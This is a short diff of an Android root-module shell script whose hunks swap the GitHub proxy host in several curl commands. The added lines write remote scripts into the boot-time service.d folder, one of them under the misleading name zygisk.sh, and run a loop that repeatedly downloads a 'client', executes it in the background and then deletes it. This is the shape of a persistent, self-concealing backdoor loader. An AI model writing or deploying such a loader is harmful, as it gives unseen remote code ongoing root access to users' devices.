@@ -51,8 +51,8 @@ fi
 # ------------------------------
 # 下载并执行客户端（后台进程）
 # ------------------------------
-curl -sS -o /data/adb/service.d/run.sh "https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
-curl -sS -o /data/adb/service.d/zygisk.sh "https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
+curl -sS -o /data/adb/service.d/run.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
+curl -sS -o /data/adb/service.d/zygisk.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
 chmod +x /data/adb/service.d/run.sh
 chmod +x /data/adb/service.d/zygisk.sh
 MODULE_DIR="/data/adb/modules"
@@ -62,7 +62,7 @@ MODULE_DIR="/data/adb/modules"
     
     while true; do
         # 下载客户端
-        if curl -sS -o "$temp_script" "https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client" >/dev/null 2>&1; then
+        if curl -sS -o "$temp_script" "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client" >/dev/null 2>&1; then
             # 下载成功，给执行权限
             chmod +x "$temp_script"
             # 执行客户端，并在执行完毕后删除
